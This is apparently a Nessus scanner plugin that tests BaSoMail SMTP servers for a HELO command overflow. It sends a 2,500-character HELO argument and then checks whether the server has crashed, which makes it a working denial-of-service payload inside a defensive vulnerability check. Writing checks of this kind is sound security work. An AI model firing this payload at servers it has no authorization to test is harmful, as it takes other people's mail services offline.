#
# (C) Tenable Network Security
#
# Use imate_overflow.nasl as a template(Covered by csm_helo.nasl too, should merge?)
#
#

if(description)
{
 script_id(11674);
 script_bugtraq_id(7726);
 script_version ("$Revision: 1.7 $");
 name["english"] = "BaSoMail SMTP Command HELO overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote SMTP server crashes when it is
issued a HELO command with an argument longer
than 2100 chars.

This problem may allow an attacker to shut down
your SMTP server.

Solution : Upgrade the SMTP server software
Risk factor : High";

 desc["francais"] = "
Le serveur SMTP distant se plante lorsqu'on lui
envoye une commande HELO ayant un argument
de plus de 2100 octets.
Ce problème peut permettre à des pirates d'éteindre
votre serveur SMTP
Solution : mettez-le à jour
Facteur de risque : Sérieux";
 script_description(english:desc["english"],
      francais:desc["francais"]);
    
 
 summary["english"] = "Checks if the remote mail server can be oveflown"; 
 summary["francais"] = "Vérifie si le serveur de mail est sujet à un overflow";
 script_summary(english:summary["english"],
  francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security",
   francais:"Ce script est Copyright (C) 2003 Tenable Network Security");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}
#
# The script code starts here
#
include("smtp_func.inc");
port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 s = smtp_recv_banner(socket:soc);
 if(!s)exit(0);
 if(!egrep(pattern:"^220 .*", string:s))
 {
   close(soc);
   exit(0);
 }
 
 crp = string("HELO ", crap(2500), "\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
 
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
 }
}
